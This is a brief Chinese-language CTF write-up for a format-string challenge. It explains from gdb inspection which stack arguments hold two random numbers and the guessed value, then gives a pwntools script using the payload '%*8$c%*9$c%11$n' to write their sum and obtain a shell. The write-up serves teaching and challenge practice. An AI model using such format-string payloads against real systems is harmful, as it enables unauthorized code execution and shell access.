# fmt

典型的格式化字符串漏洞, 先分析程序.当输入的结果和两个随机数的和相等时,直接拿到shell

![g5D8ld.png](https://z3.ax1x.com/2021/05/19/g5D8ld.png)

通过gdb调试,在输入数据后查看栈地址,会发现两个随机数在栈上的2,3个参数,输入数据在第5个参数,由于64位特性,前六个参数压入rdi 、rsi、rdx、 rcx 、r8 和 r9得知随机数存在第8,9个参数中,猜测的数存在第11个参数中,通过格式化字符串%*将第八第九个参数以空格数量形式表示,通过%n根据前面字符数量向指定地址写入数据，达到猜中效果.

![gTI1bV.png](https://z3.ax1x.com/2021/05/20/gTI1bV.png)

~~~
from pwn import *

context(log_level = 'debug')

p = process('./ans')
# p = remote("10.212.27.23", 15329)
payload = "%*8$c%*9$c%11$n"
p.recvuntil('?\n')

p.sendline(payload)
p.recvuntil('gift.\n')
p.sendline(b'1')
p.interactive()
~~~

